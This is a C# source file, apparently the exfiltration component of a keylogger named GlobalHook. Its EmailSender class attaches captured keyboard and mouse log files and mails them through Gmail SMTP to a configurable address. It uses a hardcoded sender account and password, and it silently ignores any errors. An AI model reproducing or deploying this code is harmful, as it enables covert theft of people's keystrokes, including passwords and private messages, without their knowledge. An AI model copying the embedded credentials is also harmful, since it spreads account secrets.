using System;
using System.Collections.Generic;
using System.Configuration;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using MailKit.Net.Smtp;
using MimeKit;

namespace GlobalHook
{
    class EmailSender
    {
        private const string FromAddress = "insertokai@gmail.com";
        private const string Password = "platinumthetrinity";
        private readonly SettingAdapter _adapter;

        public EmailSender(SettingAdapter adapter)
        {
            _adapter = adapter;
        }

        public void SendMouseLog(string path)
        {
            SendMessage(path, "Mouse log");
        }

        public void SendKeysLog(string path)
        {
            SendMessage(path, "Keyboard log");
        }

        private void SendMessage(string path, string caption)
        {
            var message = new MimeMessage();
            message.From.Add(new MailboxAddress("Logger", FromAddress));
            message.To.Add(new MailboxAddress(" ", _adapter.DestinationEmail));
            message.Subject = caption;
            var builder = new BodyBuilder();
            builder.Attachments.Add(path);
            message.Body = builder.ToMessageBody();
            try
            {
                using (var client = new SmtpClient())
                {
                    client.Connect("smtp.gmail.com",465,true);
                    client.Authenticate(FromAddress,Password);
                    client.Send(message);
                    client.Disconnect(true);
                }
            }
            catch (Exception)
            {
               // ignore
            }
        }

    }
}
